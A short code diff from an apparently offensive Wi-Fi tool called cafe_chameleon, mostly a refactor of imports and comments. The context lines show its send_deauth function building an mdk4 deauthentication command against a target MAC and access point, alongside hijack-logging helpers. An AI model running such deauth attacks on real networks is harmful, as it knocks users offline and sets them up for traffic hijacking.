@@ -8,8 +8,9 @@ import shutil
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 from cafe_chameleon.utils.process import _run
+from cafe_chameleon.utils.tracing import trace
 from cafe_chameleon.ui.console import log_hijack, set_hijack_status
-from cafe_chameleon.scanners.air_scanner import get_monitor_interface, set_monitor_mode, set_managed_mode
+from cafe_chameleon.scanners.air import get_monitor_interface, set_monitor_mode, set_managed_mode
 
 
 def is_monitor_mode_active(iface: str) -> bool:
@@ -59,7 +60,6 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
                 tf.write(f"{target_mac}\n")
                 tmp_target_file = tf.name
 
-            # MDK4 Amok syntax: mdk4 <iface> d -B <bssid> -b <target_file> -s 100
             cmd = ["mdk4", mon_iface, "d", "-B", bssid_target, "-b", tmp_target_file, "-s", "100"]
             if channel:
                 cmd.extend(["-c", str(channel)])
@@ -106,5 +106,3 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
         set_managed_mode(interface)
 
     return success
-
-
